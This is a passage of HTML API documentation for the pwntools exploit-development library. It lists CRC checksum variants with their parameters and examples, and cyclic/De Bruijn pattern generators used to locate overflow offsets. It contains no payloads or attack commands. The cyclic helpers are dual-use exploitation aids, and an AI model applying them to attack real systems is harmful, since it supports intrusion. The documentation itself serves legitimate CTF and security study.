</tbody>
</table>
<p class="rubric">Example</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span> <span class="n">crc_8_maxim</span><span class="p">(</span><span class="s1">&#39;123456789&#39;</span><span class="p">)</span>
<span class="go">161</span>
</pre></div>
</div>
</dd></dl>

<dl class="function">
<dt id="pwnlib.util.crc.crc_8_opensafety">
<code class="descclassname">pwnlib.util.crc.</code><code class="descname">crc_8_opensafety</code><span class="sig-paren">(</span><em>data</em><span class="sig-paren">)</span> &#x2192; int<a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/util/crc.py#L301-302"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.util.crc.crc_8_opensafety" title="Permalink to this definition">¶</a></dt>
<dd><p>Calculates the crc_8_opensafety checksum.</p>
<p>This is simply the <a class="reference internal" href="#pwnlib.util.crc.generic_crc" title="pwnlib.util.crc.generic_crc"><code class="xref py py-func docutils literal"><span class="pre">generic_crc()</span></code></a> with these frozen arguments:</p>
<ul class="simple">
<li>polynom = 0x2f</li>
<li>width   = 8</li>
<li>init    = 0x0</li>
<li>refin   = False</li>
<li>refout  = False</li>
<li>xorout  = 0x0</li>
</ul>
<p>See also: <a class="reference external" href="http://reveng.sourceforge.net/crc-catalogue/all.htm#crc.cat.crc-8-opensafety">http://reveng.sourceforge.net/crc-catalogue/all.htm#crc.cat.crc-8-opensafety</a></p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><strong>data</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#str" title="(in Python v2.7)"><em>str</em></a>) &#8211; The data to checksum.</td>
</tr>
</tbody>
</table>
<p class="rubric">Example</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span> <span class="n">crc_8_opensafety</span><span class="p">(</span><span class="s1">&#39;123456789&#39;</span><span class="p">)</span>
<span class="go">62</span>
</pre></div>
</div>
</dd></dl>

<dl class="function">
<dt id="pwnlib.util.crc.crc_8_rohc">
<code class="descclassname">pwnlib.util.crc.</code><code class="descname">crc_8_rohc</code><span class="sig-paren">(</span><em>data</em><span class="sig-paren">)</span> &#x2192; int<a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/util/crc.py#L301-302"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.util.crc.crc_8_rohc" title="Permalink to this definition">¶</a></dt>
<dd><p>Calculates the crc_8_rohc checksum.</p>
<p>This is simply the <a class="reference internal" href="#pwnlib.util.crc.generic_crc" title="pwnlib.util.crc.generic_crc"><code class="xref py py-func docutils literal"><span class="pre">generic_crc()</span></code></a> with these frozen arguments:</p>
<ul class="simple">
<li>polynom = 0x7</li>
<li>width   = 8</li>
<li>init    = 0xff</li>
<li>refin   = True</li>
<li>refout  = True</li>
<li>xorout  = 0x0</li>
</ul>
<p>See also: <a class="reference external" href="http://reveng.sourceforge.net/crc-catalogue/all.htm#crc.cat.crc-8-rohc">http://reveng.sourceforge.net/crc-catalogue/all.htm#crc.cat.crc-8-rohc</a></p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><strong>data</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#str" title="(in Python v2.7)"><em>str</em></a>) &#8211; The data to checksum.</td>
</tr>
</tbody>
</table>
<p class="rubric">Example</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span> <span class="n">crc_8_rohc</span><span class="p">(</span><span class="s1">&#39;123456789&#39;</span><span class="p">)</span>
<span class="go">208</span>
</pre></div>
</div>
</dd></dl>

<dl class="function">
<dt id="pwnlib.util.crc.crc_8_sae_j1850">
<code class="descclassname">pwnlib.util.crc.</code><code class="descname">crc_8_sae_j1850</code><span class="sig-paren">(</span><em>data</em><span class="sig-paren">)</span> &#x2192; int<a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/util/crc.py#L301-302"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.util.crc.crc_8_sae_j1850" title="Permalink to this definition">¶</a></dt>
<dd><p>Calculates the crc_8_sae_j1850 checksum.</p>
<p>This is simply the <a class="reference internal" href="#pwnlib.util.crc.generic_crc" title="pwnlib.util.crc.generic_crc"><code class="xref py py-func docutils literal"><span class="pre">generic_crc()</span></code></a> with these frozen arguments:</p>
<ul class="simple">
<li>polynom = 0x1d</li>
<li>width   = 8</li>
<li>init    = 0xff</li>
<li>refin   = False</li>
<li>refout  = False</li>
<li>xorout  = 0xff</li>
</ul>
<p>See also: <a class="reference external" href="http://reveng.sourceforge.net/crc-catalogue/all.htm#crc.cat.crc-8-sae-j1850">http://reveng.sourceforge.net/crc-catalogue/all.htm#crc.cat.crc-8-sae-j1850</a></p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><strong>data</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#str" title="(in Python v2.7)"><em>str</em></a>) &#8211; The data to checksum.</td>
</tr>
</tbody>
</table>
<p class="rubric">Example</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span> <span class="n">crc_8_sae_j1850</span><span class="p">(</span><span class="s1">&#39;123456789&#39;</span><span class="p">)</span>
<span class="go">75</span>
</pre></div>
</div>
</dd></dl>

<dl class="function">
<dt id="pwnlib.util.crc.crc_8_wcdma">
<code class="descclassname">pwnlib.util.crc.</code><code class="descname">crc_8_wcdma</code><span class="sig-paren">(</span><em>data</em><span class="sig-paren">)</span> &#x2192; int<a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/util/crc.py#L301-302"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.util.crc.crc_8_wcdma" title="Permalink to this definition">¶</a></dt>
<dd><p>Calculates the crc_8_wcdma checksum.</p>
<p>This is simply the <a class="reference internal" href="#pwnlib.util.crc.generic_crc" title="pwnlib.util.crc.generic_crc"><code class="xref py py-func docutils literal"><span class="pre">generic_crc()</span></code></a> with these frozen arguments:</p>
<ul class="simple">
<li>polynom = 0x9b</li>
<li>width   = 8</li>
<li>init    = 0x0</li>
<li>refin   = True</li>
<li>refout  = True</li>
<li>xorout  = 0x0</li>
</ul>
<p>See also: <a class="reference external" href="http://reveng.sourceforge.net/crc-catalogue/all.htm#crc.cat.crc-8-wdcma">http://reveng.sourceforge.net/crc-catalogue/all.htm#crc.cat.crc-8-wdcma</a></p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><strong>data</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#str" title="(in Python v2.7)"><em>str</em></a>) &#8211; The data to checksum.</td>
</tr>
</tbody>
</table>
<p class="rubric">Example</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span> <span class="n">crc_8_wcdma</span><span class="p">(</span><span class="s1">&#39;123456789&#39;</span><span class="p">)</span>
<span class="go">37</span>
</pre></div>
</div>
</dd></dl>

<dl class="function">
<dt id="pwnlib.util.crc.crc_a">
<code class="descclassname">pwnlib.util.crc.</code><code class="descname">crc_a</code><span class="sig-paren">(</span><em>data</em><span class="sig-paren">)</span> &#x2192; int<a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/util/crc.py#L301-302"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.util.crc.crc_a" title="Permalink to this definition">¶</a></dt>
<dd><p>Calculates the crc_a checksum.</p>
<p>This is simply the <a class="reference internal" href="#pwnlib.util.crc.generic_crc" title="pwnlib.util.crc.generic_crc"><code class="xref py py-func docutils literal"><span class="pre">generic_crc()</span></code></a> with these frozen arguments:</p>
<ul class="simple">
<li>polynom = 0x1021</li>
<li>width   = 16</li>
<li>init    = 0xc6c6</li>
<li>refin   = True</li>
<li>refout  = True</li>
<li>xorout  = 0x0</li>
</ul>
<p>See also: <a class="reference external" href="http://reveng.sourceforge.net/crc-catalogue/all.htm#crc.cat.crc-a">http://reveng.sourceforge.net/crc-catalogue/all.htm#crc.cat.crc-a</a></p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><strong>data</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#str" title="(in Python v2.7)"><em>str</em></a>) &#8211; The data to checksum.</td>
</tr>
</tbody>
</table>
<p class="rubric">Example</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span> <span class="n">crc_a</span><span class="p">(</span><span class="s1">&#39;123456789&#39;</span><span class="p">)</span>
<span class="go">48901</span>
</pre></div>
</div>
</dd></dl>

<dl class="function">
<dt id="pwnlib.util.crc.jamcrc">
<code class="descclassname">pwnlib.util.crc.</code><code class="descname">jamcrc</code><span class="sig-paren">(</span><em>data</em><span class="sig-paren">)</span> &#x2192; int<a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/util/crc.py#L301-302"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.util.crc.jamcrc" title="Permalink to this definition">¶</a></dt>
<dd><p>Calculates the jamcrc checksum.</p>
<p>This is simply the <a class="reference internal" href="#pwnlib.util.crc.generic_crc" title="pwnlib.util.crc.generic_crc"><code class="xref py py-func docutils literal"><span class="pre">generic_crc()</span></code></a> with these frozen arguments:</p>
<ul class="simple">
<li>polynom = 0x4c11db7</li>
<li>width   = 32</li>
<li>init    = 0xffffffff</li>
<li>refin   = True</li>
<li>refout  = True</li>
<li>xorout  = 0x0</li>
</ul>
<p>See also: <a class="reference external" href="http://reveng.sourceforge.net/crc-catalogue/all.htm#crc.cat.jamcrc">http://reveng.sourceforge.net/crc-catalogue/all.htm#crc.cat.jamcrc</a></p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><strong>data</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#str" title="(in Python v2.7)"><em>str</em></a>) &#8211; The data to checksum.</td>
</tr>
</tbody>
</table>
<p class="rubric">Example</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span> <span class="n">jamcrc</span><span class="p">(</span><span class="s1">&#39;123456789&#39;</span><span class="p">)</span>
<span class="go">873187033</span>
</pre></div>
</div>
</dd></dl>

<dl class="function">
<dt id="pwnlib.util.crc.kermit">
<code class="descclassname">pwnlib.util.crc.</code><code class="descname">kermit</code><span class="sig-paren">(</span><em>data</em><span class="sig-paren">)</span> &#x2192; int<a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/util/crc.py#L301-302"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.util.crc.kermit" title="Permalink to this definition">¶</a></dt>
<dd><p>Calculates the kermit checksum.</p>
<p>This is simply the <a class="reference internal" href="#pwnlib.util.crc.generic_crc" title="pwnlib.util.crc.generic_crc"><code class="xref py py-func docutils literal"><span class="pre">generic_crc()</span></code></a> with these frozen arguments:</p>
<ul class="simple">
<li>polynom = 0x1021</li>
<li>width   = 16</li>
<li>init    = 0x0</li>
<li>refin   = True</li>
<li>refout  = True</li>
<li>xorout  = 0x0</li>
</ul>
<p>See also: <a class="reference external" href="http://reveng.sourceforge.net/crc-catalogue/all.htm#crc.cat.kermit">http://reveng.sourceforge.net/crc-catalogue/all.htm#crc.cat.kermit</a></p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><strong>data</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#str" title="(in Python v2.7)"><em>str</em></a>) &#8211; The data to checksum.</td>
</tr>
</tbody>
</table>
<p class="rubric">Example</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span> <span class="n">kermit</span><span class="p">(</span><span class="s1">&#39;123456789&#39;</span><span class="p">)</span>
<span class="go">8585</span>
</pre></div>
</div>
</dd></dl>

<dl class="function">
<dt id="pwnlib.util.crc.modbus">
<code class="descclassname">pwnlib.util.crc.</code><code class="descname">modbus</code><span class="sig-paren">(</span><em>data</em><span class="sig-paren">)</span> &#x2192; int<a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/util/crc.py#L301-302"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.util.crc.modbus" title="Permalink to this definition">¶</a></dt>
<dd><p>Calculates the modbus checksum.</p>
<p>This is simply the <a class="reference internal" href="#pwnlib.util.crc.generic_crc" title="pwnlib.util.crc.generic_crc"><code class="xref py py-func docutils literal"><span class="pre">generic_crc()</span></code></a> with these frozen arguments:</p>
<ul class="simple">
<li>polynom = 0x8005</li>
<li>width   = 16</li>
<li>init    = 0xffff</li>
<li>refin   = True</li>
<li>refout  = True</li>
<li>xorout  = 0x0</li>
</ul>
<p>See also: <a class="reference external" href="http://reveng.sourceforge.net/crc-catalogue/all.htm#crc.cat.modbus">http://reveng.sourceforge.net/crc-catalogue/all.htm#crc.cat.modbus</a></p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><strong>data</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#str" title="(in Python v2.7)"><em>str</em></a>) &#8211; The data to checksum.</td>
</tr>
</tbody>
</table>
<p class="rubric">Example</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span> <span class="n">modbus</span><span class="p">(</span><span class="s1">&#39;123456789&#39;</span><span class="p">)</span>
<span class="go">19255</span>
</pre></div>
</div>
</dd></dl>

<dl class="function">
<dt id="pwnlib.util.crc.x_25">
<code class="descclassname">pwnlib.util.crc.</code><code class="descname">x_25</code><span class="sig-paren">(</span><em>data</em><span class="sig-paren">)</span> &#x2192; int<a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/util/crc.py#L301-302"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.util.crc.x_25" title="Permalink to this definition">¶</a></dt>
<dd><p>Calculates the x_25 checksum.</p>
<p>This is simply the <a class="reference internal" href="#pwnlib.util.crc.generic_crc" title="pwnlib.util.crc.generic_crc"><code class="xref py py-func docutils literal"><span class="pre">generic_crc()</span></code></a> with these frozen arguments:</p>
<ul class="simple">
<li>polynom = 0x1021</li>
<li>width   = 16</li>
<li>init    = 0xffff</li>
<li>refin   = True</li>
<li>refout  = True</li>
<li>xorout  = 0xffff</li>
</ul>
<p>See also: <a class="reference external" href="http://reveng.sourceforge.net/crc-catalogue/all.htm#crc.cat.x-25">http://reveng.sourceforge.net/crc-catalogue/all.htm#crc.cat.x-25</a></p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><strong>data</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#str" title="(in Python v2.7)"><em>str</em></a>) &#8211; The data to checksum.</td>
</tr>
</tbody>
</table>
<p class="rubric">Example</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span> <span class="n">x_25</span><span class="p">(</span><span class="s1">&#39;123456789&#39;</span><span class="p">)</span>
<span class="go">36974</span>
</pre></div>
</div>
</dd></dl>

<dl class="function">
<dt id="pwnlib.util.crc.xfer">
<code class="descclassname">pwnlib.util.crc.</code><code class="descname">xfer</code><span class="sig-paren">(</span><em>data</em><span class="sig-paren">)</span> &#x2192; int<a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/util/crc.py#L301-302"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.util.crc.xfer" title="Permalink to this definition">¶</a></dt>
<dd><p>Calculates the xfer checksum.</p>
<p>This is simply the <a class="reference internal" href="#pwnlib.util.crc.generic_crc" title="pwnlib.util.crc.generic_crc"><code class="xref py py-func docutils literal"><span class="pre">generic_crc()</span></code></a> with these frozen arguments:</p>
<ul class="simple">
<li>polynom = 0xaf</li>
<li>width   = 32</li>
<li>init    = 0x0</li>
<li>refin   = False</li>
<li>refout  = False</li>
<li>xorout  = 0x0</li>
</ul>
<p>See also: <a class="reference external" href="http://reveng.sourceforge.net/crc-catalogue/all.htm#crc.cat.xfer">http://reveng.sourceforge.net/crc-catalogue/all.htm#crc.cat.xfer</a></p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><strong>data</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#str" title="(in Python v2.7)"><em>str</em></a>) &#8211; The data to checksum.</td>
</tr>
</tbody>
</table>
<p class="rubric">Example</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span> <span class="n">xfer</span><span class="p">(</span><span class="s1">&#39;123456789&#39;</span><span class="p">)</span>
<span class="go">3171672888</span>
</pre></div>
</div>
</dd></dl>

<dl class="function">
<dt id="pwnlib.util.crc.xmodem">
<code class="descclassname">pwnlib.util.crc.</code><code class="descname">xmodem</code><span class="sig-paren">(</span><em>data</em><span class="sig-paren">)</span> &#x2192; int<a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/util/crc.py#L301-302"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.util.crc.xmodem" title="Permalink to this definition">¶</a></dt>
<dd><p>Calculates the xmodem checksum.</p>
<p>This is simply the <a class="reference internal" href="#pwnlib.util.crc.generic_crc" title="pwnlib.util.crc.generic_crc"><code class="xref py py-func docutils literal"><span class="pre">generic_crc()</span></code></a> with these frozen arguments:</p>
<ul class="simple">
<li>polynom = 0x1021</li>
<li>width   = 16</li>
<li>init    = 0x0</li>
<li>refin   = False</li>
<li>refout  = False</li>
<li>xorout  = 0x0</li>
</ul>
<p>See also: <a class="reference external" href="http://reveng.sourceforge.net/crc-catalogue/all.htm#crc.cat.xmodem">http://reveng.sourceforge.net/crc-catalogue/all.htm#crc.cat.xmodem</a></p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><strong>data</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#str" title="(in Python v2.7)"><em>str</em></a>) &#8211; The data to checksum.</td>
</tr>
</tbody>
</table>
<p class="rubric">Example</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span> <span class="n">xmodem</span><span class="p">(</span><span class="s1">&#39;123456789&#39;</span><span class="p">)</span>
<span class="go">12739</span>
</pre></div>
</div>
</dd></dl>

</div>
<span id="document-util/cyclic"></span><div class="section" id="module-pwnlib.util.cyclic">
<span id="pwnlib-util-cyclic-generation-of-unique-sequences"></span><h3><a class="reference internal" href="#module-pwnlib.util.cyclic" title="pwnlib.util.cyclic"><code class="xref py py-mod docutils literal"><span class="pre">pwnlib.util.cyclic</span></code></a> &#8212; Generation of unique sequences<a class="headerlink" href="#module-pwnlib.util.cyclic" title="Permalink to this headline">¶</a></h3>
<dl class="function">
<dt id="pwnlib.util.cyclic.cyclic">
<code class="descclassname">pwnlib.util.cyclic.</code><code class="descname">cyclic</code><span class="sig-paren">(</span><em>length = None</em>, <em>alphabet = string.ascii_lowercase</em>, <em>n = 4</em><span class="sig-paren">)</span> &#x2192; list/str<a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/util/cyclic.py#L45-85"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.util.cyclic.cyclic" title="Permalink to this definition">¶</a></dt>
<dd><p>A simple wrapper over <a class="reference internal" href="#pwnlib.util.cyclic.de_bruijn" title="pwnlib.util.cyclic.de_bruijn"><code class="xref py py-func docutils literal"><span class="pre">de_bruijn()</span></code></a>. This function returns at most
<cite>length</cite> elements.</p>
<p>If the given alphabet is a string, a string is returned from this function. Otherwise
a list is returned.</p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><ul class="first last simple">
<li><strong>length</strong> &#8211; The desired length of the list or None if the entire sequence is desired.</li>
<li><strong>alphabet</strong> &#8211; List or string to generate the sequence over.</li>
<li><strong>n</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#int" title="(in Python v2.7)"><em>int</em></a>) &#8211; The length of subsequences that should be unique.</li>
</ul>
</td>
</tr>
</tbody>
</table>
<p class="rubric">Example</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">cyclic</span><span class="p">(</span><span class="n">alphabet</span> <span class="o">=</span> <span class="s2">&quot;ABC&quot;</span><span class="p">,</span> <span class="n">n</span> <span class="o">=</span> <span class="mi">3</span><span class="p">)</span>
<span class="go">&#39;AAABAACABBABCACBACCBBBCBCCC&#39;</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">cyclic</span><span class="p">(</span><span class="mi">20</span><span class="p">)</span>
<span class="go">&#39;aaaabaaacaaadaaaeaaa&#39;</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">alphabet</span><span class="p">,</span> <span class="n">n</span> <span class="o">=</span> <span class="nb">range</span><span class="p">(</span><span class="mi">30</span><span class="p">),</span> <span class="mi">3</span>
<span class="gp">&gt;&gt;&gt; </span><span class="nb">len</span><span class="p">(</span><span class="n">alphabet</span><span class="p">)</span><span class="o">**</span><span class="n">n</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">cyclic</span><span class="p">(</span><span class="n">alphabet</span> <span class="o">=</span> <span class="n">alphabet</span><span class="p">,</span> <span class="n">n</span> <span class="o">=</span> <span class="n">n</span><span class="p">))</span>
<span class="go">(27000, 27000)</span>
</pre></div>
</div>
</dd></dl>

<dl class="function">
<dt id="pwnlib.util.cyclic.cyclic_find">
<code class="descclassname">pwnlib.util.cyclic.</code><code class="descname">cyclic_find</code><span class="sig-paren">(</span><em>subseq</em>, <em>alphabet = string.ascii_lowercase</em>, <em>n = None</em><span class="sig-paren">)</span> &#x2192; int<a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/util/cyclic.py#L87-131"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.util.cyclic.cyclic_find" title="Permalink to this definition">¶</a></dt>
<dd><p>Calculates the position of a substring into a De Bruijn sequence.</p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><ul class="first last simple">
<li><strong>subseq</strong> &#8211; The subsequence to look for. This can be a string, a list or an
integer. If an integer is provided it will be packed as a
little endian integer.</li>
<li><strong>alphabet</strong> &#8211; List or string to generate the sequence over.</li>
<li><strong>n</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#int" title="(in Python v2.7)"><em>int</em></a>) &#8211; The length of subsequences that should be unique.</li>
</ul>
</td>
</tr>
</tbody>
</table>
<p class="rubric">Examples</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">cyclic_find</span><span class="p">(</span><span class="n">cyclic</span><span class="p">(</span><span class="mi">1000</span><span class="p">)[</span><span class="mi">514</span><span class="p">:</span><span class="mi">518</span><span class="p">])</span>
<span class="go">514</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">cyclic_find</span><span class="p">(</span><span class="mh">0x61616162</span><span class="p">)</span>
<span class="go">4</span>
</pre></div>
</div>
</dd></dl>

<dl class="function">
<dt id="pwnlib.util.cyclic.cyclic_metasploit">
<code class="descclassname">pwnlib.util.cyclic.</code><code class="descname">cyclic_metasploit</code><span class="sig-paren">(</span><em>length = None, sets = [ string.ascii_uppercase, string.ascii_lowercase, string.digits ]</em><span class="sig-paren">)</span> &#x2192; str<a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/util/cyclic.py#L161-196"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.util.cyclic.cyclic_metasploit" title="Permalink to this definition">¶</a></dt>
<dd><p>A simple wrapper over <a class="reference internal" href="#pwnlib.util.cyclic.metasploit_pattern" title="pwnlib.util.cyclic.metasploit_pattern"><code class="xref py py-func docutils literal"><span class="pre">metasploit_pattern()</span></code></a>. This function returns a
string of length <cite>length</cite>.</p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><ul class="first last simple">
<li><strong>length</strong> &#8211; The desired length of the string or None if the entire sequence is desired.</li>
<li><strong>sets</strong> &#8211; List of strings to generate the sequence over.</li>
</ul>
</td>
</tr>
</tbody>
</table>
<p class="rubric">Example</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">cyclic_metasploit</span><span class="p">(</span><span class="mi">32</span><span class="p">)</span>
<span class="go">&#39;Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab&#39;</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">cyclic_metasploit</span><span class="p">(</span><span class="n">sets</span> <span class="o">=</span> <span class="p">[</span><span class="s2">&quot;AB&quot;</span><span class="p">,</span><span class="s2">&quot;ab&quot;</span><span class="p">,</span><span class="s2">&quot;12&quot;</span><span class="p">])</span>
<span class="go">&#39;Aa1Aa2Ab1Ab2Ba1Ba2Bb1Bb2&#39;</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">cyclic_metasploit</span><span class="p">()[</span><span class="mi">1337</span><span class="p">:</span><span class="mi">1341</span><span class="p">]</span>
<span class="go">&#39;5Bs6&#39;</span>
<span class="gp">&gt;&gt;&gt; </span><span class="nb">len</span><span class="p">(</span><span class="n">cyclic_metasploit</span><span class="p">())</span>
<span class="go">20280</span>
</pre></div>
</div>
</dd></dl>

<dl class="function">
<dt id="pwnlib.util.cyclic.cyclic_metasploit_find">
<code class="descclassname">pwnlib.util.cyclic.</code><code class="descname">cyclic_metasploit_find</code><span class="sig-paren">(</span><em>subseq, sets = [ string.ascii_uppercase, string.ascii_lowercase, string.digits ]</em><span class="sig-paren">)</span> &#x2192; int<a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/util/cyclic.py#L198-221"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.util.cyclic.cyclic_metasploit_find" title="Permalink to this definition">¶</a></dt>
<dd><p>Calculates the position of a substring into a Metasploit Pattern sequence.</p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><ul class="first last simple">
<li><strong>subseq</strong> &#8211; The subsequence to look for. This can be a string or an
integer. If an integer is provided it will be packed as a
little endian integer.</li>
<li><strong>sets</strong> &#8211; List of strings to generate the sequence over.</li>
</ul>
</td>
</tr>
</tbody>
</table>
<p class="rubric">Examples</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">cyclic_metasploit_find</span><span class="p">(</span><span class="n">cyclic_metasploit</span><span class="p">(</span><span class="mi">1000</span><span class="p">)[</span><span class="mi">514</span><span class="p">:</span><span class="mi">518</span><span class="p">])</span>
<span class="go">514</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">cyclic_metasploit_find</span><span class="p">(</span><span class="mh">0x61413161</span><span class="p">)</span>
<span class="go">4</span>
</pre></div>
</div>
</dd></dl>

<dl class="function">
<dt id="pwnlib.util.cyclic.de_bruijn">
<code class="descclassname">pwnlib.util.cyclic.</code><code class="descname">de_bruijn</code><span class="sig-paren">(</span><em>alphabet = string.ascii_lowercase</em>, <em>n = 4</em><span class="sig-paren">)</span> &#x2192; generator<a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/util/cyclic.py#L12-43"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.util.cyclic.de_bruijn" title="Permalink to this definition">¶</a></dt>
<dd><p>Generator for a sequence of unique substrings of length <cite>n</cite>. This is implemented using a
De Bruijn Sequence over the given <cite>alphabet</cite>.</p>
<p>The returned generator will yield up to <code class="docutils literal"><span class="pre">len(alphabet)**n</span></code> elements.</p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
